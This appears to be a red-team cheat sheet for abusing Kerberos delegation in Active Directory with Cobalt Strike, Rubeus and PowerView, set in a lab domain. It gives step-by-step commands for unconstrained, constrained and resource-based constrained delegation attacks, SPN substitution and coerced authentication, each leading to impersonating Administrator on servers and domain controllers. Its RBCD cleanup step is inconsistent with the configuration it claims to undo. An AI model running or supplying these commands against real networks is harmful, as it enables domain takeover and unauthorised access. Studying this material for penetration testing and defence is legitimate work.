# Kerberos Delegation (Cobalt Strike)

---

## Service Ticket Cheatsheet

| Service | Description | Ticket(s) |
|---------|-------------|-----------|
| SMB | Remote filesystem access | CIFS |
| PsExec | Service Control Manager | CIFS |
| WinRM | Windows Remote Management | HTTP |
| WMI | Process execution | RPCSS, HOST, RestrictedKrbHost |
| RDP | Remote Desktop | TERMSRV, HOST |
| MSSQL | SQL Databases | MSSQLSvc |

---

## Unconstrained Delegation

Computer can request TGTs on behalf of any user who authenticates to it.

### Find Unconstrained Delegation

```
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

> **Note:** Domain Controllers are always configured for unconstrained delegation.

### Exploit

Move laterally to the unconstrained delegation host:
```
jump psexec64 ilf-web-1 smb
```

Monitor for incoming TGTs:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap

# Kill monitor job when done
jobs
jobkill 0
```

Inject captured TGT:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:INLANEFREIGHT.LOCAL /username:bjohnson /password:FakePass /ticket:<captured-TGT>

steal_token <pid>
run klist
ls \\ilf-dc-1\c$

# Cleanup
rev2self
kill <pid>
```

---

## Constrained Delegation

Limited delegation via `msDS-AllowedToDelegateTo` attribute.

### Find Constrained Delegation

```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
```

### Check Protocol Transition

Protocol transition requires `TRUSTED_TO_AUTH_FOR_DELEGATION` (16777216) flag.

```
ldapsearch (&(samAccountType=805306369)(samaccountname=ilf-ws-1$)) --attributes userAccountControl
```

PowerShell check:
```powershell
[System.Convert]::ToBoolean(16781312 -band 16777216)  # True = enabled
```

### Exploit (Protocol Transition Enabled)

Move laterally and dump computer TGT:
```
make_token INLANEFREIGHT\tmorgan Passw0rd!
jump psexec64 ilf-ws-1 smb

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
```

Perform S4U to impersonate any user:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:ilf-ws-1$ /msdsspn:cifs/ilf-fs-1 /ticket:<computer-TGT> /impersonateuser:Administrator /nowrap
```

Inject and access:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:INLANEFREIGHT.LOCAL /username:Administrator /password:FakePass /ticket:<service-ticket>

steal_token <pid>
ls \\ilf-fs-1\c$
```

### Exploit (Protocol Transition NOT Enabled)

Must use captured user service tickets (cannot freely impersonate).

Use `/tgs` instead of `/impersonateuser`:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:ilf-ws-1$ /msdsspn:cifs/ilf-fs-1 /ticket:<computer-TGT> /tgs:<captured-user-service-ticket> /nowrap
```

---

## Service Name Substitution

Swap service ticket SPN to access different services on the same account.

### Find Delegation to Weak Service

```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo

# Example: delegation to TIME service
msDS-AllowedToDelegateTo: time/ilf-dc-1.inlanefreight.local
```

### Exploit (Substitute CIFS for TIME)

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:ilf-ws-1$ /msdsspn:time/ilf-dc-1 /altservice:cifs /ticket:<computer-TGT> /impersonateuser:Administrator /nowrap
```

Multiple services at once:
```
/altservice:cifs,host,http
```

---

## S4U2self Computer Takeover

Use captured computer TGT to get service ticket as any user.

### Trigger Authentication (SpoolSample/PetitPotam)

On unconstrained delegation host (high integrity):
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
```

From medium integrity beacon (domain user):
```
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe ilf-dc-1 ilf-ws-1
```

### Use Captured Computer TGT

Computer accounts don't have admin access to themselves - use S4U2self:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/ilf-dc-1 /ticket:<computer-TGT> /nowrap
```

Inject and access:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:INLANEFREIGHT.LOCAL /username:Administrator /password:FakePass /ticket:<cifs-ticket>

steal_token <pid>
ls \\ilf-dc-1\c$
```

---

## Resource-Based Constrained Delegation (RBCD)

Back-end service controls who can delegate to it via `msDS-AllowedToActOnBehalfOfOtherIdentity`.

### Requirements

1. Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on target
2. Control of a principal with an SPN set

### Find Write Access (PowerView via SOCKS)

```powershell
Import-Module C:\Tools\PowerSploit\Recon\PowerView.ps1
$Cred = Get-Credential INLANEFREIGHT\tmorgan

# WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity
# GUID: 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79

Get-DomainComputer -Server 10.10.120.1 -Credential $Cred | Get-DomainObjectAcl -Server 10.10.120.1 -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty' } | select ObjectDN,SecurityIdentifier

# Also check GenericAll and GenericWrite
```

### Identify SID Owner

```powershell
Get-ADGroup -Filter 'objectsid -eq "S-1-5-21-XXXXXXXXXX-1107"' -Server 10.10.120.1 -Credential $Cred
```

### Account with SPN Options

| Option | Description |
|--------|-------------|
| Computer account | Any computer you have SYSTEM on |
| Service account | If you have kerberoasted creds |
| Create new computer | `msDS-MachineAccountQuota` (default: 10) |

### Configure RBCD

```powershell
$wkstn1 = Get-ADComputer -Identity 'ilf-wkstn-1' -Server 10.10.120.1 -Credential $Cred
Set-ADComputer -Identity 'ilf-fs-1' -PrincipalsAllowedToDelegateToAccount $wkstn1 -Server 10.10.120.1 -Credential $Cred
```

### Exploit

Dump TGT from controlled computer:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
```

Perform S4U:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:ilf-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/ilf-fs-1 /ticket:<computer-TGT> /nowrap
```

Inject and access:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:INLANEFREIGHT.LOCAL /username:Administrator /password:FakePass /ticket:<service-ticket>

steal_token <pid>
ls \\ilf-fs-1\c$
```

### Cleanup

```powershell
$ws1 = Get-ADComputer -Identity 'ilf-ws-1' -Server 10.10.120.1 -Credential $Cred
Set-ADComputer -Identity 'ilf-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 10.10.120.1 -Credential $Cred
```

---

## Quick Reference

| Delegation Type | Attribute | Attack Summary |
|-----------------|-----------|----------------|
| Unconstrained | `userAccountControl` (524288) | Monitor for TGTs, steal and use |
| Constrained | `msDS-AllowedToDelegateTo` | S4U with computer TGT |
| Constrained (no PT) | Same | Need captured user service ticket |
| RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` | Add controlled SPN, S4U |
